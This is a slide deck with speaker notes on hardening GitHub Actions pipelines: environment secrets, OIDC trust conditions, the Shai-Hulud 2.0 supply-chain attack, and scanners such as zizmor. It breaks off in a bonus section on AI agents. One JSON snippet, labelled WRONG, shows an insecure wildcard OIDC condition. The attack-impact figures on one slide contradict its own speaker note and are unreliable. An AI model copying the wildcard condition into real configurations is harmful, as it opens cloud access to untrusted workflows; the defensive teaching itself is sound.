.good-label {
  background: #02DA21;
  color: white;
}

.bad-label {
  background: #F85569;
  color: white;
}
</style>

<div class="secrets-container">
  <div class="left-column">
    <div class="text-box">
      <h3>🔒 Environment as Boundary</h3>
      <ul>
        <li>Environments create boundaries for secrets</li>
        <li>Jobs only access assigned environment secrets</li>
        <li>Protection rules (reviewers, branches, timers)</li>
        <li>Principle of least privilege</li>
      </ul>
    </div>

```yaml
jobs:
  deploy-production:
    environment: production
    runs-on: ubuntu-latest
    steps:
    - name: checkout code
      uses: actions/checkout@v5

    - name: Deploy to production
      env:
        API_KEY: ${{ secrets.PROD_API_KEY }}            
      run: deploy.sh production
```

  </div>
  
  <div class="right-column">
    <div class="text-box">
      <h3>🎯 OIDC Best Practices</h3>
      <ul>
        <li>Keep jobs minimal and focused</li>
        <li>Avoid third-party actions with OIDC jobs</li>
        <li>Actions inherit GITHUB_TOKEN permissions</li>
        <li>Strict trust relationships - no wildcards</li>
      </ul>
    </div>
    <div class="code-example">
      <p class="example-label bad-label">❌ WRONG</p>

```json
"Condition": {
  "StringEquals": {
    "...:sub": "repo:my-org/project-*",                        
  }
}
```
</div>
    <div class="code-example">
      <p class="example-label good-label">✅ GOOD</p>

```json
"Condition": {
  "StringEquals": {
    "...:sub": "repo:my-rog/project-x:environment:production",
  }
}
```
  </div>

  </div>
</div>

<!-- Five best practices: environments for gating, env-level secrets, restrict OIDC claims, rotate regularly, audit access. Tight claim conditions are critical. -->

---

<!--
_backgroundColor: #1A1A2E
_color: white
-->

<style scoped>
section {
  padding: 20px;
}

h1 {
  margin-top: 0;
  margin-bottom: 0;
  font-size: 1.2rem;
}

.image-container {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100%;
}

.image-container img {
  max-height: 100%;
  max-width: 100%;
  object-fit: contain;
}
</style>

# 🪱 Shai-Hulud 2.0: The Supply Chain Tsunami

<div class="image-container">
  <img src="assets/img/shaihulud-annotated.png" alt="Shai-Hulud 2.0 Attack Flow" />
</div>

<!-- Walk through the diagram: script injection → secrets stolen → action takeover → downstream compromise. Everything we discussed in one kill chain. -->

---



<!--
_backgroundColor: #DC2626
_color: white
-->

<style scoped>
.impact-container {
  display: flex;
  flex-direction: column;
  height: 85%;
  gap: 0.6rem;
  padding: 0.5rem 1rem;
}

.stats-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  grid-template-rows: 1fr 1fr;
  gap: 0.8rem;
  flex: 1;
}

.stat-card {
  background: rgba(255, 255, 255, 0.15);
  border-radius: 12px;
  padding: 0.6rem 1rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  display: flex;
  flex-direction: column;
  justify-content: flex-start;
}

.stat-number {
  font-size: 2.0rem;
  font-weight: bold;
  color: #FCD34D;
  margin-bottom: 0.3rem;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
}

.stat-description {
  font-size: 0.5rem;
  line-height: 1.1;
  color: #FEE2E2;
}

.source-note {
  background: rgba(0, 0, 0, 0.3);
  border-radius: 8px;
  padding: 0.3rem 0.8rem;
  font-size: 0.4rem;
  color: #E2E8F0;
  font-style: italic;
  text-align: center;
  white-space: nowrap;
}

.source-note strong {
  color: #FCD34D;
}
</style>

# 💥 Shai-Hulud 2.0 Impact

![bg left:40%](../../assets/shared/img/impact.jpg)

<div class="impact-container">
  <div class="stats-grid">
    <div class="stat-card">
      <div class="stat-number">1,195+</div>
      <div class="stat-description">Distinct orgs (banks, government bodies, and Fortune 500)</div>
    </div> 
    <div class="stat-card">
      <div class="stat-number">25,000+</div>
      <div class="stat-description">Malicious repositories created for exfiltration</div>
    </div>
    <div class="stat-card">
      <div class="stat-number">700+</div>
      <div class="stat-description">NPM packages infiltrated with malicious code</div>
    </div>
    <div class="stat-card">
      <div class="stat-number">33,000+</div>
      <div class="stat-description">Unique secrets exposed (GitHub PAT, Cloud, ...)</div>
    </div>
  </div>
  
  <div class="source-note">
    Sources: <strong>Entro</strong> (organizations), <strong>Wiz</strong> (repos & packages), <strong>GitGuardian</strong> (secrets)
  </div>
</div>

<!-- Real numbers: 218 orgs, 23k repos, 33k secrets. This is the scale of a single supply chain attack. -->

---


<!--
_backgroundColor: #000000
_color: white
_footer: ''
-->

<style scoped>
section {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  background: linear-gradient(135deg, #0f172a 0%, #1e3a5f 50%, #0d1f3c 100%);
}

h1 {
  font-size: 5rem;
  text-align: center;
  margin: 0;
  background: linear-gradient(90deg, #10B981, #3B82F6, #8B5CF6);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  text-shadow: none;
  font-weight: 800;
  letter-spacing: 0.1em;
}

.subtitle {
  font-size: 1.3rem;
  color: #94A3B8;
  margin-top: 1.5rem;
  font-style: italic;
}

.icon-row {
  display: flex;
  gap: 2rem;
  margin-top: 2rem;
  font-size: 2.5rem;
}

.part-badge {
  position: absolute;
  top: 40px;
  left: 40px;
  background: rgba(16, 185, 129, 0.3);
  border: 2px solid #10B981;
  color: #6EE7B7;
  padding: 0.5rem 1.2rem;
  border-radius: 8px;
  font-size: 0.8rem;
  font-weight: bold;
  letter-spacing: 0.15em;
}
</style>

<div class="part-badge">PART 2</div>

# HARDEN

<div class="subtitle">Securing your pipeline</div>

<div class="icon-row">
  <span>🛡️</span>
  <span>🔐</span>
  <span>✅</span>
  <span>🔍</span>
</div>

<!-- Transition slide — pause. "Now that we've seen the attacks, let's harden." -->

---


<!--
_backgroundColor: #4A5568
_color: white
-->

<style scoped>
.recap-container {
  display: flex;
  flex-direction: column;
  gap: 1rem;
  padding: 0.1rem;
}

.recap-intro {
  text-align: center;
  margin-bottom: 0rem;
}

.recap-intro p {
  font-size: 0.8rem;
  color: #E2E8F0;
  margin: 0;
  font-style: italic;
}

.patterns-grid {
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 1.0rem;
  flex: 1;
}

.pattern-card {
  padding: 0.8rem;
  display: flex;
  gap: 1.0rem;
  align-items: flex-start;
}

.pattern-emoji {
  font-size: 1.8rem;
  flex-shrink: 0;
}

.pattern-content {
  flex: 1;
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}

.pattern-title {
  font-size: 0.8rem;
  font-weight: bold;
  color: #F7FAFC;
  margin: 0;
}

.pattern-problem {
  font-size: 0.65rem;
  color: #FEB2B2;
  margin: 0;
  line-height: 1.2;
}

.pattern-solution {
  font-size: 0.65rem;
  color: #9AE6B4;
  margin: 0;
  line-height: 1.2;
}

.bottom-card {
  grid-column: 1 / -1;
  background: rgba(255, 255, 255, 0.15);
}
</style>

# 🔄 Security patterns for GitHub Actions

<div class="recap-container">
  <div class="recap-intro">
    <p><em>We've explored common security risks and their solutions</em></p>
  </div>
  
  <div class="patterns-grid">
    <div class="pattern-card card">
      <span class="pattern-emoji">📦</span>
      <div class="pattern-content">
        <h3 class="pattern-title">Third-Party Actions</h3>
        <p class="pattern-problem">❌ Floating tags can be hijacked</p>
        <p class="pattern-solution">✅ Pin to SHA + use Dependabot</p>
      </div>
    </div>
    <div class="pattern-card card">
      <span class="pattern-emoji">💉</span>
      <div class="pattern-content">
        <h3 class="pattern-title">Script Injection</h3>
        <p class="pattern-problem">❌ User input directly in run commands</p>
        <p class="pattern-solution">✅ Use environment variables</p>
      </div>
    </div>
    <div class="pattern-card card">
      <span class="pattern-emoji">🎯</span>
      <div class="pattern-content">
        <h3 class="pattern-title">Dangerous triggers</h3>
        <p class="pattern-problem">❌ Untrusted code + write permissions</p>
        <p class="pattern-solution">✅ Extreme caution with non controlled triggers</p>
      </div>
    </div>
    <div class="pattern-card card">
      <span class="pattern-emoji">🔑</span>
      <div class="pattern-content">
        <h3 class="pattern-title">GitHub Token and Secrets</h3>
        <p class="pattern-problem">❌ Avoid long lived secrets</p>
        <p class="pattern-solution">✅ Explicit least-privilege permissions</p>
      </div>
    </div>
  </div>
</div>

<!-- Quick recap of the four attack patterns we covered. Each has a clear mitigation. -->

---

<!--
_backgroundColor: #1A202C
_color: white
-->

<style scoped>
.config-container {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 2rem;
  height: 85%;
  align-items: start;
}

.image-section {
  display: flex;
  justify-content: center;
  align-items: flex-start;
  height: 100%;
}

.placeholder-image {
  max-width: 100%;
  max-height: 100%;
  object-fit: contain;
  border-radius: 12px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
}

.config-content {
  display: flex;
  flex-direction: column;
  gap: 1.2rem;
}

.config-item {
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 0.8rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  display: flex;
  align-items: center;
  gap: 0.4rem;
  transition: transform 0.2s ease;
}



.config-emoji {
  font-size: 1.0rem;
  flex-shrink: 0;
}

.config-text {
  font-size: 0.7rem;
  color: #F7FAFC;
  margin: 0;
}

.config-highlight {
  color: #68D391;
  font-weight: bold;
}
</style>

# 🛡️ Protect by configuration

<div class="config-container">
  <div class="image-section">
    <img src="../../assets/shared/img/gh-actions-config.png" class="placeholder-image" />
  </div>

  <div class="config-content">
    <div class="config-item">
      <span class="config-emoji">✅</span>
      <p class="config-text"><span class="config-highlight">Allow list</span> for trusted actions</p>
    </div>
    <div class="config-item">
      <span class="config-emoji">📌</span>
      <p class="config-text"><span class="config-highlight">Enforce SHA pinned</span> actions</p>
    </div>
    <div class="config-item">
      <span class="config-emoji">🔐</span>
      <p class="config-text"><span class="config-highlight">Drop GITHUB_TOKEN</span> to read-only permissions</p>
    </div>
    <div class="config-item">
      <span class="config-emoji">🚫</span>
      <p class="config-text"><span class="config-highlight">Be cautious</span> with write tokens in a PR</p>
    </div>
  </div>
</div>

<!-- GitHub org settings: allow-list actions, enforce SHA pinning, drop default token to read-only. Quick wins. -->

---

<!--
_backgroundColor: #1A202C
_color: white
-->

<style scoped>
.security-container {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 2rem;
  height: 85%;
  align-items: start;
}

.image-section {
  display: flex;
  justify-content: center;
  align-items: flex-start;
  height: 100%;
}

.placeholder-image {
  max-width: 100%;
  max-height: 100%;
  object-fit: contain;
  border-radius: 12px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
}

.security-content {
  display: flex;
  flex-direction: column;
  gap: 1.2rem;
}

.security-item {
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 0.8rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  display: flex;
  align-items: center;
  gap: 1rem;
  transition: transform 0.2s ease;
}



.security-emoji {
  font-size: 1.4rem;
  flex-shrink: 0;
}

.security-text {
  font-size: 1.0rem;
  line-height: 1.5;
  color: #F7FAFC;
  margin: 0;
}

.security-highlight {
  color: #68D391;
  font-weight: bold;
}
</style>

# 🔍 GitHub Advanced Security

<div class="security-container">
  <div class="image-section">
    <div class="placeholder-image">
      <img src="../../assets/shared/img/ghas-actions.png" class="placeholder-image" />
    </div>
  </div>
  <div class="security-content">
    <div class="security-item">
      <span class="security-emoji">🛡️</span>
      <p class="security-text"><span class="security-highlight">Scan Actions</span> with GHAS</p>
    </div>
    <div class="security-item">
      <span class="security-emoji">👀</span>
      <p class="security-text"><span class="security-highlight">Review GitHub Actions</span> do not blindly trust</p>
    </div>
    <div class="security-item">
      <span class="security-emoji">🔓</span>
      <p class="security-text"><span class="security-highlight">Unlock GHAS power</span> for secrets & multi-language protection</p>
    </div>
  </div>
</div>

<!-- GHAS: CodeQL scans actions too, secret scanning catches leaks, Dependabot updates pinned SHAs. -->

---

<!--
_backgroundColor: #059669
_color: white
-->

<style scoped>
.opensource-container {
  display: flex;
  flex-direction: column;
  gap: 1rem;
  height: 85%;
  padding: 0.8rem;
}

.intro-text {
  text-align: center;
  background: rgba(255, 255, 255, 0.15);
  border-radius: 12px;
  padding: 0.5rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.intro-text p {
  margin: 0;
  font-size: 0.8rem;
  color: #F0FDF4;
  font-style: italic;
}

.tools-grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 1rem;
  flex: 1;
}

.tool-card {
  padding: 1rem;
  background: rgba(34, 197, 94, 0.2);
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  display: flex;
  flex-direction: column;
  gap: 0.6rem;
  align-items: center;
  text-align: center;
  border: 1px solid rgba(34, 197, 94, 0.3);
}

.tool-emoji {
  font-size: 1.8rem;
  margin-bottom: 0.2rem;
}

.tool-name {
  font-size: 0.9rem;
  font-weight: bold;
  color: #ECFDF5;
  margin: 0 0 0.3rem 0;
}

.tool-description {
  font-size: 0.65rem;
  color: #D1FAE5;
  margin: 0;
  line-height: 1.3;
  flex-grow: 1;
}

.tool-focus {
  font-size: 0.6rem;
  color: #065F46;
  font-weight: bold;
  margin: 0;
  padding: 0.2rem 0.6rem;
  background: rgba(34, 197, 94, 0.4);
  border-radius: 6px;
}

.tool-focus-security {
  font-size: 0.6rem;
  color: #FEF3C7;
  font-weight: bold;
  margin: 0;
  padding: 0.2rem 0.6rem;
  background: rgba(180, 83, 9, 0.9);
  border-radius: 6px;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
}

.tool-focus-general {
  font-size: 0.6rem;
  color: #E5E7EB;
  font-weight: bold;
  margin: 0;
  padding: 0.2rem 0.6rem;
  background: rgba(107, 114, 128, 0.6);
  border-radius: 6px;
}

.disclaimer-sticker {
  position: absolute;
  top: 40px;
  right: 20px;
  background: #EF4444;
  color: white;
  padding: 0.5rem 1rem;
  border-radius: 12px;
  font-size: 0.55rem;
  font-weight: bold;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
  transform: rotate(15deg);
  z-index: 10;
  border: 2px solid #DC2626;
  text-align: center;
  line-height: 1.2;
}
</style>

# 🔓 Open source static analyzers for GitHub Actions


<div class="opensource-container">
  <div class="intro-text">
    <p><em>Community-driven tools to enhance your GitHub Actions security</em></p>
  </div>
  
  <div class="tools-grid">
    <div class="tool-card">
      <span class="tool-emoji">⚡</span>
      <h3 class="tool-name">Zizmor</h3>
      <p class="tool-description">A dedicated linter for GitHub Actions that provides comprehensive security rules and integrates seamlessly into CI/CD workflows.</p>
      <p class="tool-focus-security">Security Focus</p>
    </div>
    <div class="tool-card">
      <span class="tool-emoji">🛡️</span>
      <h3 class="tool-name">Checkov</h3>
      <p class="tool-description">An Infrastructure as Code (IaC) security scanner that analyzes cloud infrastructure configurations to identify and fix security policy violations.</p>
      <p class="tool-focus-security">IaC Security</p>
    </div>
    <div class="tool-card">
      <span class="tool-emoji">🔍</span>
      <h3 class="tool-name">Action Lint</h3>
      <p class="tool-description">A general-purpose linter for GitHub Actions workflows focused on syntax validation and ensuring best practices are followed.</p>
      <p class="tool-focus-general">Syntax & Quality</p>
    </div>
  </div>
</div>

<!-- Three open source tools: Zizmor (security-focused), Checkov (IaC), actionlint (syntax). Zizmor is our top pick. -->

---

<!--
_backgroundColor: #1A202C
_color: white
-->

<style scoped>
.zizmor-container {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 2rem;
  height: 85%;
  align-items: start;
}

.image-section {
  display: flex;
  justify-content: center;
  align-items: flex-start;
  height: 100%;
}

.placeholder-image {
  max-width: 100%;
  max-height: 100%;
  object-fit: contain;
  border-radius: 12px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
}

.zizmor-content {
  display: flex;
  flex-direction: column;
  gap: 1.2rem;
}

.zizmor-item {
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 0.8rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  display: flex;
  align-items: center;
  gap: 1rem;
}

.zizmor-emoji {
  font-size: 1.4rem;
  flex-shrink: 0;
}

.zizmor-text {
  font-size: 0.7em;
  line-height: 1.0;
  color: #F7FAFC;
  margin: 0;
}

.zizmor-highlight {
  color: #FCD34D;
  font-weight: bold;
}
</style>

# 🔧 Zizmor static analysis for GitHub Actions

<div class="zizmor-container">
  <div class="image-section">
    <div class="placeholder-image">
      <img src="../../assets/shared/img/zizmor.png" class="placeholder-image" />
    </div>
  </div>
  
  <div class="zizmor-content">
    <div class="zizmor-item">
      <span class="zizmor-emoji">📋</span>
      <p class="zizmor-text"><span class="zizmor-highlight">Extensive rule set</span> for comprehensive scanning</p>
    </div>
    <div class="zizmor-item">
      <span class="zizmor-emoji">⚙️</span>
      <p class="zizmor-text"><span class="zizmor-highlight">Highly configurable</span> to fit your needs</p>
    </div>
    <div class="zizmor-item">
      <span class="zizmor-emoji">🔗</span>
      <p class="zizmor-text"><span class="zizmor-highlight">Integrates with GHAS</span> seamlessly</p>
    </div>
    <div class="zizmor-item">
      <span class="zizmor-emoji">🛠️</span>
      <p class="zizmor-text"><span class="zizmor-highlight">Use with CLI, IDE, pre-commit or Actions</span></p>
    </div>
  </div>
</div>

<!-- Zizmor: dedicated GH Actions security linter. CLI, IDE, pre-commit, or as an Action. GHAS integration. DEMO TIME — 10 minutes. -->

---

<!--
_backgroundColor: #0B1222
_color: white
-->

<style scoped>
.demo-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 1.2rem;
  height: 80%;
  text-align: center;
}

.demo-title {
  font-size: 2.2rem;
  font-weight: bold;
  color: #FCD34D;
  margin: 0;
  letter-spacing: 2px;
}

.demo-subtitle {
  font-size: 0.9rem;
  color: #CBD5E0;
  margin: 0;
  max-width: 600px;
  line-height: 1.5;
}

.demo-qr {
  width: 220px;
  height: 220px;
  border-radius: 16px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
  background: white;
  padding: 10px;
}

.demo-hint {
  font-size: 0.65rem;
  color: #93C5FD;
  font-style: italic;
  margin: 0;
}

.demo-sticker {
  position: absolute;
  top: 3rem;
  right: 0.5rem;
  background: #1E293B;
  color: #E2E8F0;
  font-size: 0.52rem;
  font-weight: 700;
  padding: 0.3rem 0.7rem;
  transform: rotate(45deg);
  transform-origin: center center;
  box-shadow: 3px 4px 10px rgba(0, 0, 0, 0.5);
  letter-spacing: 0.3px;
  font-family: 'Courier New', monospace;
  border: 1.5px solid #94A3B8;
  border-radius: 6px;
  white-space: nowrap;
  z-index: 10;
}
</style>

# 🎬 Demo

<div class="demo-container">
  <p class="demo-title">⚡ ZIZMOR IN ACTION ⚡</p>
  <p class="demo-subtitle">Static analysis for GitHub Actions workflows — from insecure workflows to hardened pipelines</p>
  <img src="assets/img/demo-zizmor-qr.png" class="demo-qr" alt="Demo QR Code" />
  <p class="demo-hint">Scan to follow along — demo repo</p>
</div>

<div class="demo-sticker">Powered by Demo Time</div>

<!-- DEMO: Run zizmor against workflows, show findings, GHAS integration. ~10 minutes. -->

---

<!--
_backgroundColor: #1A202C
_color: white
-->

<style scoped>
.openssf-container {
  display: flex;
  flex-direction: column;
  gap: 1rem;
  height: 85%;
  padding: 0.5rem;
}

.openssf-intro {
  text-align: center;
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 0.5rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
}

.openssf-intro p {
  margin: 0;
  font-size: 0.6rem;
  color: #E2E8F0;
  font-style: italic;
}

.openssf-grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 1rem;
  flex: 1;
}

.openssf-card {
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 1rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
  align-items: center;
  text-align: center;
}

.openssf-card-emoji {
  font-size: 1.8rem;
}

.openssf-card-title {
  font-size: 0.75rem;
  font-weight: bold;
  color: #F7FAFC;
  margin: 0;
}

.openssf-card-desc {
  font-size: 0.55rem;
  color: #CBD5E0;
  margin: 0;
  line-height: 1.4;
  flex-grow: 1;
}

.openssf-card-badge {
  font-size: 0.55rem;
  font-weight: bold;
  margin: 0;
  padding: 0.2rem 0.6rem;
  border-radius: 6px;
}

.badge-scorecard {
  color: #ECFDF5;
  background: rgba(16, 185, 129, 0.5);
  border: 1px solid rgba(16, 185, 129, 0.6);
}

.badge-slsa {
  color: #EFF6FF;
  background: rgba(59, 130, 246, 0.5);
  border: 1px solid rgba(59, 130, 246, 0.6);
}

.badge-attestation {
  color: #FEF3C7;
  background: rgba(245, 158, 11, 0.5);
  border: 1px solid rgba(245, 158, 11, 0.6);
}

.openssf-footer {
  text-align: center;
  background: rgba(16, 185, 129, 0.15);
  border: 1px solid rgba(16, 185, 129, 0.3);
  border-radius: 8px;
  padding: 0.4rem;
  font-size: 0.6rem;
  color: #6EE7B7;
  font-style: italic;
}
</style>

# 🏛️ OpenSSF & Supply Chain Integrity

<div class="openssf-container">
  <div class="openssf-intro">
    <p>The <strong>Open Source Security Foundation</strong> (Linux Foundation) provides frameworks and tools to secure the software supply chain</p>
  </div>

  <div class="openssf-grid">
    <div class="openssf-card">
      <span class="openssf-card-emoji">📊</span>
      <h3 class="openssf-card-title">OpenSSF Scorecard</h3>
      <p class="openssf-card-desc">Automated security health checks for open source projects. Scores 17 risk areas: pinned dependencies, branch protection, dangerous workflows, token permissions, and more.</p>
      <p class="openssf-card-badge badge-scorecard">Runs as a GitHub Action</p>
    </div>
    <div class="openssf-card">
      <span class="openssf-card-emoji">🔏</span>
      <h3 class="openssf-card-title">SLSA Framework</h3>
      <p class="openssf-card-desc">Supply-chain Levels for Software Artifacts. Defines build provenance requirements across levels 1→3, ensuring artifacts are traceable back to source and build system.</p>
      <p class="openssf-card-badge badge-slsa">Build Provenance</p>
    </div>
    <div class="openssf-card">
      <span class="openssf-card-emoji">✍️</span>
      <h3 class="openssf-card-title">GitHub Attestations</h3>
      <p class="openssf-card-desc">Native artifact attestations built on Sigstore. Cryptographically sign build provenance for your artifacts directly in GitHub Actions — verifiable with <code>gh attestation verify</code>.</p>
      <p class="openssf-card-badge badge-attestation">Sigstore-based</p>
    </div>
  </div>


</div>


<!-- OpenSSF Scorecard for health checks, SLSA for build provenance, GitHub Attestations for Sigstore-based artifact signing. All integrate with Actions. -->

---

<!--
_backgroundColor: #00126E
_color: white
-->

<style scoped>
.universal-container-v2 {
  display: flex;
  flex-direction: column;
  gap: 0.6rem;
  height: 85%;
}

.intro-box-v2 {
  text-align: center;
  padding: 0.3rem;
}

.intro-box-v2 p {
  margin: 0;
  font-size: 0.85rem;
  color: #FFCF50;
  font-weight: 600;
  font-style: italic;
}

.principles-grid-v2 {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 0.8rem;
  flex: 1;
}

.principle-card-v2 {
  background: linear-gradient(135deg, rgba(255, 255, 255, 0.12) 0%, rgba(255, 255, 255, 0.05) 100%);
  border-radius: 10px;
  padding: 0.7rem;
  text-align: center;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.principle-icon {
  font-size: 1.6rem;
  margin-bottom: 0.3rem;
}

.principle-card-v2 h4 {
  color: #FFFFFF;
  margin: 0 0 0.4rem 0;
  font-size: 0.7rem;
  font-weight: 700;
}

.principle-card-v2 ul {
  font-size: 0.5rem;
  line-height: 1.4;
  margin: 0;
  padding: 0;
  list-style: none;
  color: #CBD5E0;
  text-align: left;
}

.principle-card-v2 li {
  padding: 0.1rem 0;
  position: relative;
  padding-left: 0.7rem;
}

.principle-card-v2 li::before {
  content: "•";
  color: #FFCF50;
  position: absolute;
  left: 0;
  font-weight: bold;
}

.example-row-v2 {
  display: flex;
  gap: 0.6rem;
  justify-content: center;
  flex-wrap: wrap;
  margin-top: 0.2rem;
}

.example-badge-v2 {
  background: rgba(255, 207, 80, 0.2);
  border: 1px solid rgba(255, 207, 80, 0.4);
  border-radius: 20px;
  padding: 0.25rem 0.6rem;
  font-size: 0.5rem;
  color: #FFCF50;
  font-weight: 500;
}
</style>

# 🌐 Universal Security Principles

<div class="universal-container-v2">
  <div class="intro-box-v2">
    <p>Not just GitHub Actions — these patterns apply everywhere automation runs</p>
  </div>
  
  <div class="principles-grid-v2">
    <div class="principle-card-v2">
      <span class="principle-icon">🔗</span>
      <h4>Trust Boundaries</h4>
      <ul>
        <li>Pin dependencies immutably</li>
        <li>Verify third-party sources</li>
        <li>Assume external = untrusted</li>
      </ul>
    </div>
    <div class="principle-card-v2">
      <span class="principle-icon">🔑</span>
      <h4>Least Privilege</h4>
      <ul>
        <li>Minimal token scopes</li>
        <li>Short-lived credentials</li>
        <li>No standing access</li>
      </ul>
    </div>
    <div class="principle-card-v2">
      <span class="principle-icon">🛡️</span>
      <h4>Defense in Depth</h4>
      <ul>
        <li>Multiple security layers</li>
        <li>Scan & audit continuously</li>
        <li>Monitor for anomalies</li>
      </ul>
    </div>
    <div class="principle-card-v2">
      <span class="principle-icon">💉</span>
      <h4>Input Validation</h4>
      <ul>
        <li>Never trust user input</li>
        <li>Sanitize before execution</li>
        <li>Escape special characters</li>
      </ul>
    </div>
  </div>
  
  <div class="example-row-v2">
    <span class="example-badge-v2">GitHub Actions</span>
    <span class="example-badge-v2">GitLab CI</span>
    <span class="example-badge-v2">Jenkins</span>
    <span class="example-badge-v2">Azure DevOps</span>
    <span class="example-badge-v2">AI Agents</span>
  </div>
</div>

<!-- These principles apply universally — not just GitHub Actions. Least privilege, zero trust, defense in depth, input validation. -->

---

<!-- ==================== BONUS: AI AGENTS ==================== -->

<!--
_backgroundColor: #000000
_color: white
_footer: ''
-->

<style scoped>
section {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  background: linear-gradient(135deg, #1a0a2e 0%, #2d1b4e 50%, #1a0a2e 100%);
}

h1 {
  font-size: 5rem;
  text-align: center;
  margin: 0;
  background: linear-gradient(90deg, #A855F7, #EC4899, #F472B6);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  text-shadow: none;
  font-weight: 800;
  letter-spacing: 0.1em;
}

.subtitle {
  font-size: 1.3rem;
  color: #94A3B8;
  margin-top: 1.5rem;
  font-style: italic;
}

.icon-row {
  display: flex;
  gap: 2rem;
  margin-top: 2rem;
  font-size: 2.5rem;
}

.bonus-badge {
  position: absolute;
  top: 40px;
  right: 40px;
  background: #FBBF24;
  color: #1F2937;
  padding: 0.5rem 1.2rem;
  border-radius: 8px;
  font-size: 0.8rem;
  font-weight: bold;
  transform: rotate(12deg);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
}
</style>

<div class="bonus-badge">🐘 ONE MORE THING</div>

# AI AGENTS

<div class="subtitle">Old vulnerabilities, new velocity</div>

<div class="icon-row">
  <span>🤖</span>
  <span>⚡</span>
  <span>🔗</span>
  <span>🛡️</span>
</div>

<!-- One more thing — same vulnerabilities, but AI agents amplify speed and scale. -->

---

<!--
_backgroundColor: #A80DF2
_color: white
-->

<style scoped>
h1 {
  margin-bottom: 0.5rem;
  font-size: 1.6rem;
}
.evolution-container {
  display: flex;
  flex-direction: column;
  gap: 0.8rem;
}
.timeline {
  display: grid;
  grid-template-columns: 1fr auto 1fr;
  gap: 1.5rem;
  align-items: start;
}
.era-card {
  background: rgba(0, 0, 0, 0.4);
  border-radius: 16px;
  padding: 1rem 1.2rem;
}
.era-card.past {
  opacity: 0.9;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
}
.era-card.future {
  box-shadow: 0 0 30px rgba(251, 191, 36, 0.3);
}
.era-header {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  margin-bottom: 0.6rem;
}
.era-icon {
  font-size: 1.4rem;
}
.era-title {
  font-size: 1rem;
  font-weight: 700;
  color: #E9D5FF;
}
.era-card.future .era-title {
  color: #FBBF24;
}
.era-items {
  list-style: none;
  padding: 0;
  margin: 0;
  font-size: 0.7rem;
  line-height: 1.6;
}
.era-items li {
  padding: 0.2rem 0;
  display: flex;
  align-items: flex-start;
  gap: 0.5rem;
}

.era-items li::before {
  content: "→";
  color: #94A3B8;
}

.era-card.future .era-items li::before {
  color: #FBBF24;
}

.arrow-divider {
  font-size: 2.5rem;
  color: #FBBF24;
  text-shadow: 0 0 20px rgba(251, 191, 36, 0.5);
  align-self: center;
}

.tension-box {
  text-align: center;
  margin-top: 1rem;
}
.tension-text {
  font-size: 1rem;
  font-weight: 600;
  color: white;
}

.tension-text span {
  font-weight: 800;
  color: #FBBF24;
}
</style>

# 🌍 The World is Changing

<div class="evolution-container">
  <div class="timeline">
    <div class="era-card past">
      <div class="era-header">
        <span class="era-icon">💻</span>
        <span class="era-title">Classic Development</span>
      </div>
      <ul class="era-items">
        <li>Developer writes every line</li>
        <li>IDE suggests completions</li>
        <li>Human reviews all changes</li>
        <li>Manual tool execution</li>
        <li>You control the keyboard</li>
      </ul>
    </div>
    <div class="arrow-divider">⚡</div>
    <div class="era-card future">
      <div class="era-header">
        <span class="era-icon">🤖</span>
        <span class="era-title">Agentic Development</span>
      </div>
      <ul class="era-items">
        <li>AI writes code autonomously</li>
        <li>AI executes shell commands</li>
        <li>AI accesses your systems</li>
        <li>AI modifies your pipeline</li>
        <li>You... watch?</li>
      </ul>
    </div>
  </div>
  <div class="tension-box">
    <p class="tension-text">The <span>attack surface</span> just got a new operator</p>
  </div>
</div>

<!-- Left: traditional dev. Right: agentic. AI writes code, executes commands, accesses systems. Who reviews? -->

---

<!--
_backgroundColor: #1a1a2e
_color: white
-->

<style scoped>
.attack-grid {
  display: grid;
  grid-template-columns: 0.9fr 1.1fr;
  gap: 1.2rem;
  height: 85%;
  padding: 0.5rem;
}

.chain-box {
  background: linear-gradient(135deg, rgba(80, 20, 20, 0.95), rgba(50, 10, 10, 0.95));
  border-radius: 12px;
  padding: 0.8rem;
}

.chain-box h3 {
  color: #FCA5A5;
